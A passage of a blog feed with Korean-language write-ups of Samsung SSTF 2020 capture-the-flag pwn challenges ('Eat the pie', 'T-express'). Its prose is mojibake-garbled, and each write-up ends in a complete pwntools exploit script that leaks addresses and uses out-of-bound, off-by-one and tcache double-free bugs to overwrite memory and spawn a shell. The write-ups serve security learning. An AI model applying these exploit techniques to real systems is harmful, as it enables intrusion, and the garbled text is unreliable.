í•˜ê¸° ë²ˆê±°ë¡œì›€</li></ol><p>[ ! ] ê²°ë¡ </p><p>Arbitrary Write í•  ë°©ë²•ì„ ì°¾ì.</p><p>â€œ/bin/shâ€ì„ bssì— ì €ì¥í•˜ê³  <code>system( bss )</code>ë¥¼ í•˜ë©´ ì‰˜ íšë“ ê°€ëŠ¥.</p><h1 id="Arbitrary-Write"><a href="#Arbitrary-Write" class="headerlink" title="Arbitrary Write"></a>Arbitrary Write</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image9.png"></p><p>Arbitrary Write(Write anything anywhere)ë¥¼ í•˜ë ¤ë©´ ë‹¹ì—°íˆ ì“°ê¸° í•¨ìˆ˜ê°€ ìˆì–´ì•¼ í•˜ê² ì£ ?. ì‚¬ìš© ê°€ëŠ¥í•œ ì“°ê¸° í•¨ìˆ˜ëŠ” <code>read()</code>ê°€ ìœ ì¼í•©ë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image10.png"></p><p>out-of-boundë¡œ <code>read()</code>ë¥¼ AWì— ì‚¬ìš©í•˜ë ¤ëŠ” ì§€ê¸ˆ ìƒí™©ì—ì„œ ë„˜ì–´ì•¼ í•  ì¥ì• ë¬¼ì´ 2ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.</p><ol><li>callë¡œ eipë¥¼ ì¡ëŠ”ë‹¤ëŠ” ì </li><li><code>read()</code>ëŠ” ì¸ìë¥¼ 3ê°œë‚˜ ë°›ëŠ”ë‹¤ëŠ” ì </li></ol><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image11.png"></p><p>ì¼ë‹¨ ì²« ë²ˆì§¸, callë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ì „ì— ì¶©ì¡±ë¼ì•¼ í•˜ëŠ” ì¡°ê±´ì´ ìˆëŠ”ë°,</p><ol><li>í˜¸ì¶œë‹¹í•˜ëŠ” í•¨ìˆ˜ê°€ ì“¸ ì¸ìë“¤ì´ stackì— push ë¼ ìˆì–´ì•¼ í•¨.</li><li>ESPê°€ ê·¸ ì¸ìë“¤ ì¤‘ ê°€ì¥ ë‚®ì€ ì£¼ì†Œì— ìœ„ì¹˜í•´ì•¼ í•¨.</li></ol><p>ì ì ˆí•œ gadgetì„ ì‚¬ìš©í•œë‹¤ë©´ ì´ ë‘ ê°€ì§€ ì¡°ê±´ì„ ì¶©ì¡±í•˜ëŠ” ê²ƒì€ ëŒ€ë¶€ë¶„ í¬ê²Œ ì–´ë ¤ìš´ ì¼ì´ ì•„ë‹™ë‹ˆë‹¤. í•˜ì§€ë§Œ pyloadë¥¼ ë‹´ì„ ë©”ëª¨ë¦¬ê°€ 16byte ë°–ì— ì—†ê¸° ë•Œë¬¸ì— ì´ë§ˆì €ë„ ì–´ë ¤ìš´ ì¼ì´ ë¼ ë²„ë ¸ë„¤ìš”.</p><p>[ ! ] indexVar + gadget + parameter1 + parameter2 + parameter3 + &amp;read() = 24 byte</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image12.png"></p><p>í•œì°¸ ê³ ë¯¼í•˜ë‹¤ê°€ í•œ ê°€ì§€ ìƒê°ì´ ë¨¸ë¦¬ë¥¼ ìŠ¤ì¹˜ê³  ê°”ìŠµë‹ˆë‹¤.</p><p>â€œ32 bitì˜ ì¸ì pushëŠ” ì—­ìˆœìœ¼ë¡œ ì´ë¤„ì§„ë‹¤!â€ <del>ì´ë•Œ ì´ë§ˆë¥¼ íƒ ì¹˜ê³  ìœ ë ˆì¹´ë¥¼ ì™¸ì³¤ìŠµë‹ˆë‹¤.</del></p><p>ê²°ë¡ ë¶€í„° ì ìë©´ ìœ„ ì‚¬ì§„ì—ì„œ í•˜ì´ë¼ì´íŠ¸ ëœ ë¶€ë¶„ì„ gadgetìœ¼ë¡œ ì‚¬ìš©í•˜ë©´ ë©ë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image13.png"></p><p>ìœ„ ì‚¬ì§„ì€ <code>pwnme()</code>ì—ì„œ <code>read(0, &amp;v0, 0x10)</code>ì— í•´ë‹¹í•˜ëŠ” ì–´ì…ˆ ì½”ë“œì…ë‹ˆë‹¤. 3ë²ˆì§¸ ì¸ìë¶€í„° ì—­ìˆœìœ¼ë¡œ stackì— push í•˜ëŠ” ê²Œ ë³´ì´ì‹œë‚˜ìš”? ë§Œì•½ 3ë²ˆì§¸ ì¸ìë¥¼ push í•˜ëŠ” ì½”ë“œë¥¼ ê±´ë„ˆë›°ê³  <code>&lt;pwnme+198&gt;</code>ë¶€í„° ì‹¤í–‰ëœë‹¤ë©´ <code>read()</code>ê°€ í˜¸ì¶œë  ë•Œ stackì— ìˆë˜ ì“°ë ˆê¸° ê°’( <del>ì‚¬ì‹¤ ret addr</del> )ì„ <code>read()</code>ì˜ 3ë²ˆì§¸ ì¸ìë¡œ ì¸ì‹í•˜ê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image14.png"></p><p>í…ŒìŠ¤íŠ¸í•´ë³´ë©´ ì˜ˆìƒê³¼ ê°™ì´ <code>read(0, &amp;v0, 0x566109bc)</code>ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ ê°€ì ¯ì„ ì‚¬ìš©í•œë‹¤ë©´ 16 byte ì…ë ¥ ì œí•œìœ¼ë¡œ ë¶ˆê°€ëŠ¥í–ˆë˜ AWê°€ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&#x27;eat-the-pie.sstf.site&#x27;, &#x27;1337&#x27;)</span>p = process(<span class="hljs-string">&#x27;./target&#x27;</span>)e = ELF(<span class="hljs-string">&#x27;./target&#x27;</span>)read_plt = e.plt[<span class="hljs-string">&#x27;read&#x27;</span>]system = e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]bss = e.bss()<span class="hljs-comment"># leak binary base</span>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">12</span> + <span class="hljs-string">&#x27;BBBB&#x27;</span>p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;BBBB&#x27;</span>)leak = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x74d</span>log.info(hex(leak))<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&#x27;-3&#x27;</span>+ <span class="hljs-string">&#x27;\x00\x00&#x27;</span> + p32(leak+<span class="hljs-number">0x970</span>) <span class="hljs-comment"># read() in pwnme() without len</span>p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)<span class="hljs-comment"># arbitrary write to bss</span>payload = p32(<span class="hljs-number">0</span>) + p32(leak+bss) + p32(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(leak+read_plt)p.sendline(payload)p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&#x27;-3&#x27;</span>+ <span class="hljs-string">&#x27;\x00\x00&#x27;</span> + p32(leak+<span class="hljs-number">0x970</span>)p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)<span class="hljs-comment"># system(&quot;/bin/sh&quot;);</span>payload = <span class="hljs-string">&#x27;AAAABBBBCCCC&#x27;</span>+ p32(leak+system) + p32(leak+<span class="hljs-number">0xa99</span>) + p32(leak+bss)p.sendline(payload) <span class="hljs-comment"># 0xa99 == pop pop pop ret</span>p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image15.png"></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>calling convention</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF T-express</title>
    <link href="/2020/10/18/fabu1ous/sstf-t-express/"/>
    <url>/2020/10/18/fabu1ous/sstf-t-express/</url>
    
    <content type="html"><![CDATA[<h1 id="ë¨¸ë¦¿ë§"><a href="#ë¨¸ë¦¿ë§" class="headerlink" title="ë¨¸ë¦¿ë§"></a>ë¨¸ë¦¿ë§</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image.png"></p><p>ì‚¼ì„±ì—ì„œ ì£¼ìµœí•œ SSTFì— ì¶œì „í–ˆìŠµë‹ˆë‹¤. ì¡°ê¸ˆ ëŠ¦ì€ ê°ì´ ìˆì§€ë§Œ T-express ë¬¸ì œ í’€ì´ë¥¼ í•´ë³¼ê¹Œ í•©ë‹ˆë‹¤. T-express ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ ì—ë²„ëœë“œ ë¡œê³ ì˜ ì•„ìŠ¤í‚¤ ì•„íŠ¸ë¡œ ì €í¬ë¥¼ ë§ì´í•´ì¤ë‹ˆë‹¤. ì½”ë¡œë‚˜ ë•Œë¬¸ì— ì–´ë”” ë†€ëŸ¬ ê°€ì§€ë„ ëª»í•˜ê³  ìˆì—ˆëŠ”ë° ì˜¨ë¼ì¸ìœ¼ë¡œ ì—ë²„ëœë“œì— ê°€ë³´ë„¤ìš”. ã…ã… </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image1.png"></p><p>T-express ë°”ì´ë„ˆë¦¬ëŠ” glibc-2.31ì™€ í•¨ê»˜ ì£¼ì–´ì§„ Heapë¬¸ì œì…ë‹ˆë‹¤. glibc-2.31ëŠ” 2020ë…„ 2ì›”ì— ë¦´ë¦¬ì¦ˆ ëœ ë²„ì „ì¸ë°,  ì €ëŠ” T-expressë¥¼ í’€ë©´ì„œ ì´ ë²„ì „ì˜ tcacheë¥¼ ì²˜ìŒ ì ‘í•´ë´¤ìŠµë‹ˆë‹¤. ì´ëŸ° ì €ì¡°ì°¨ ì–´ë µì§€ ì•Šê²Œ í’€ë§Œí¼ í¬ê²Œ ì–´ë µì§€ ì•Šê³  ì¬ë°Œê²Œ í’€ ìˆ˜ ìˆëŠ” ë¬¸ì œì…ë‹ˆë‹¤.</p><p>[ì·¨ì•½ì ]</p><ol><li><p>Off-By-One</p></li><li><p>Double-Free</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="í›‘ì–´ë³´ê¸°"><a href="#í›‘ì–´ë³´ê¸°" class="headerlink" title="í›‘ì–´ë³´ê¸°"></a>í›‘ì–´ë³´ê¸°</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image2.png"></p><p>í”„ë¡œê·¸ë¨ì˜ ê¸°ëŠ¥ì€ ëŒ€ì¶© ì•„ë˜ì™€ ê°™ì´ ìš”ì•½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li><p>í‹°ì¼“ êµ¬ë§¤</p><ul><li>One Ride í‹°ì¼“ â†’ ë©”ëª¨ë¦¬ í• ë‹¹</li><li>One Day í‹°ì¼“ â†’ ë©”ëª¨ë¦¬ í• ë‹¹</li></ul></li><li><p>ë³´ìœ  ì¤‘ì¸ í‹°ì¼“ ë³´ê¸°</p></li><li><p>í‹°ì¼“ ì‚¬ìš©</p><ul><li>One Ride í‹°ì¼“ â†’ í• ë‹¹ í•´ì œ</li><li>One Day í‹°ì¼“ â†’ í™œë™ ì„ íƒ â†’ ëª¨ë“  í™œë™ ì‚¬ìš© â†’ í• ë‹¹ í•´ì œ</li></ul></li><li><p>ì¢…ë£Œ</p></li></ol><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image3.png"></p><p>êµ¬ë§¤í•  ìˆ˜ ìˆëŠ” í‹°ì¼“ì˜ ì¢…ë¥˜ëŠ” ë‘ ê°€ì§€ë¡œ ë‚˜ë‰©ë‹ˆë‹¤(One Ride Ticket / One Day Ticket). ë‘ í‹°ì¼“ì€ 3ê°€ì§€ ì°¨ì´ì ì´ ìˆìŠµë‹ˆë‹¤.</p><ol><li>í• ë‹¹ í¬ê¸°<ul><li>One Ride â†’ 0x18</li><li>One Day â†’ 0x30</li></ul></li><li>í‹°ì¼“ íƒ€ì…<ul><li>One Ride â†’ 1</li><li>One Day â†’ 0</li></ul></li><li>í•´ì œ ì¡°ê±´</li></ol><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image4.png"></p><p><code>0x55d222efe2a0</code> ì—ëŠ” One Ride Ticketì´, <code>0x55d222efe2c0</code> ì—ëŠ” One Day Ticketì´ í• ë‹¹ë¼ìˆëŠ” ëª¨ìŠµì…ë‹ˆë‹¤. í•˜ì´ë¼ì´íŠ¸ ëœ ë¶€ë¶„ì„ ë³´ì‹œë©´ <code>ticket_type</code>ê°’ì´ ì €ì¥ëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.  ì—¬ê¸°ì„œ ì§‘ì¤‘í•´ì•¼ í•  ì ì€ <code>lastname</code> ë°”ë¡œ ë‹¤ìŒì— <code>ticket_type</code>ì´ ì¡´ì¬í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image5.png"></p><p><code>lastname</code>ì€ í‹°ì¼“ì´ í• ë‹¹ëœ í›„ í•¨ìˆ˜ <code>read_str()</code>ìœ¼ë¡œ ì…ë ¥ì„ ë°›ìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image6.png"></p><p>í•¨ìˆ˜ <code>read_str()</code>ì€ ì…ë ¥ë°›ì€ string ëì— NULLì„ ì¶”ê°€í•˜ëŠ” ë£¨í‹´ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ë§Œì•½ <code>lastname</code>ì— ì…ë ¥ë°›ì„ ë•Œ 8byteë¥¼ ê½‰ ì±„ì›Œ ë„£ëŠ”ë‹¤ë©´ <code>ticket_type</code>ì˜ ê°’ì„ ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆê² ì£ ?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image7.png"></p><p>One Ride Ticketì˜ <code>ticket_type</code>ì„ NULL(0x00)ë¡œ ì˜¤ì—¼ì‹œí‚¨ ëª¨ìŠµì…ë‹ˆë‹¤. ê·¸ë˜ì„œ ì´ê±¸ë¡œ ë¬´ì–¼ í•  ìˆ˜ ìˆëŠëƒ? <code>ticket_type</code>ì„ ì˜¤ì—¼ì‹œì¼œ 0ìœ¼ë¡œ ë°”ê¾¸ë©´ One Ride Ticketì„ One Day Ticketì¸ ê²ƒì²˜ëŸ¼ ì†ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image8.png"></p><p>í•¨ìˆ˜ <code>use_ticket()</code>ì˜ ì¼ë¶€ì…ë‹ˆë‹¤. <code>ticket_type</code>ì— ë”°ë¼ ë¶„ê¸°ë¬¸ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì½”ë“œê°€ ë‹¬ë¼ì§‘ë‹ˆë‹¤. One Ride Ticketì—ëŠ” ì¡´ì¬í•˜ì§€ ì•ŠëŠ” <code>meal_ticket, safari_pass</code>ë“±ì˜ ê°’ì„ ì¡°ì‘í•˜ëŠ” ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê³  ì´ëŠ” ì¶”ê°€ë¡œ ë©”ëª¨ë¦¬ ì˜¤ì—¼ì„ ë°œìƒì‹œí‚µë‹ˆë‹¤.</p><h1 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h1><p>glibc-2.31 ë²„ì „ì˜ tcacheëŠ” double freeë¥¼ ê²€ì¦í•˜ëŠ” ì½”ë“œê°€ ì¶”ê°€ ëìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ ì¬ë°ŒëŠ” ì ì€ í¬ê¸°ê°€ ê°™ì€ tcache ë¼ë¦¬ë§Œ ê²€ì¦í•œë‹¤ëŠ” ê²ë‹ˆë‹¤. ë§Œì•½ ì²­í¬ì˜ sizeë¥¼ ì„ì˜ë¡œ ì¡°ì‘í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ìˆë‹¤ë©´ ê°™ì€ ì²­í¬ë¥¼ ë‘ ë²ˆ í•´ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image9.png"></p><p>One Ride Ticketì˜ <code>ticket_type</code>ì„ <code>0x00</code>ìœ¼ë¡œ ë°”ê¿” í•¨ìˆ˜ <code>use_ticket()</code>ì—ì„œ One Day Ticketì¸ ê²ƒì²˜ëŸ¼ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤ê³  ì„¤ëª…í–ˆìŠµë‹ˆë‹¤. ê·¸ì¤‘ <code>meal_ticket</code>ì„ ì‚¬ìš©í•˜ë©´ ë‹¤ìŒ ì²­í¬ì˜ sizeê°’ì„ ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image10.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image11.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image12.png"></p><p>ìœ„ì—ì„œ ì„¤ëª…í•œ ëŒ€ë¡œ sizeê°’ì„ ì˜¤ì—¼ì‹œí‚¨ ëª¨ìŠµì…ë‹ˆë‹¤. One Day Ticketì„ sizeê°€ 0x41ì¼ ë•Œ í•œë²ˆ, 0x21ì¼ ë•Œ í•œë²ˆ í• ë‹¹ í•´ì œë¥¼ í•´ì£¼ë©´ Double Freeê°€ ë˜ê² ì£ ?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image13.png"></p><p>ì§ ! ê°™ì€ ì£¼ì†Œê°€ ë‘ ë²ˆ í•´ì œë©ë‹ˆë‹¤. ì´ì œ ì›í•˜ëŠ” ì£¼ì†Œì— chunkë¥¼ í• ë‹¹í•´ Arbitrary Writeë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image14.png"></p><p>êµ¬ë§¤í•œ í‹°ì¼“ì€ <code>passes</code>ë¼ëŠ” ì´ë¦„ì˜ ë°°ì—´ë¡œ bssì˜ì—­ì— ì €ì¥ë©ë‹ˆë‹¤. ê° í‹°ì¼“ì— í•´ë‹¹í•˜ëŠ” chunkì˜ ì£¼ì†Œë¥¼ ì €ì¥í•˜ê³  indexë¥¼ ì‚¬ìš©í•´ ì ‘ê·¼í•©ë‹ˆë‹¤. ìœ„ ì‚¬ì§„ì€ í•¨ìˆ˜ <code>view_ticket()</code>ì˜ ì¼ë¶€ì…ë‹ˆë‹¤. ìì„¸íˆ ë³´ì‹œë©´ indexë¥¼ ê²€ì‚¬í•˜ëŠ” ë¶„ê¸°ë¬¸ì—ì„œ ìŒìˆ˜ì— ëŒ€í•œ ì˜ˆì™¸ì²˜ë¦¬ë¥¼ í•˜ì§€ ì•Šì€ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image15.png"></p><p>ë§Œì•½ <code>passes</code> ë³´ë‹¤ ë‚®ì€ ì£¼ì†Œì— ì¤‘ìš”í•œ ì •ë³´ê°€ ìˆë‹¤ë©´ Out-Of-Boundë¡œ ì¶œë ¥ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ë°°ì—´ <code>passes</code>ë³´ë‹¤ ì¡°ê¸ˆ ë‚®ì€ ì£¼ì†Œë¥¼ í™•ì¸í•´ ë³´ë©´ <code>stderr@@GLIBC</code>ê°€ ìˆë‹¤ëŠ” ê±¸ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image16.png"></p><p>í•¨ìˆ˜ <code>view_ticket()</code>ì— -4ë¥¼ indexë¡œ ì…ë ¥í•œë‹¤ë©´ <code>stderr@@GLIBC</code>ë¥¼ í†µí•´ libcì˜ base addressë¥¼ leak í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&#x27;t-express.sstf.site&#x27;, &#x27;1337&#x27;)</span>p = process(<span class="hljs-string">&#x27;./target&#x27;</span>)e = ELF(<span class="hljs-string">&#x27;./target&#x27;</span>)<span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment"># init</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;AAAA&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;CCCC&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;CCCC&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-comment"># leak libc</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;-4&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;|name |    &#x27;</span>)pad = u64(p.recv(<span class="hljs-number">4</span>)+ <span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;   &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+ <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)libc_base = leak<span class="hljs-number">-0x1ec643</span>log.info(hex(libc_base))free_hook = libc_base + <span class="hljs-number">0x1eeb28</span>log.info(hex(free_hook))system = libc_base + <span class="hljs-number">0x55410</span>log.info(hex(system))<span class="hljs-comment"># double free</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x20</span>):p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)gdb.attach(p)<span class="hljs-comment"># AW</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, p64(free_hook))p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, p64(system))p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image17.png"></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>off by one</tag>
      
      <tag>double free bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF CrackMe101</title>
    <link href="/2020/10/18/idioth/sstf-crackme101/"/>
    <url>/2020/10/18/idioth/sstf-crackme101/</url>
    
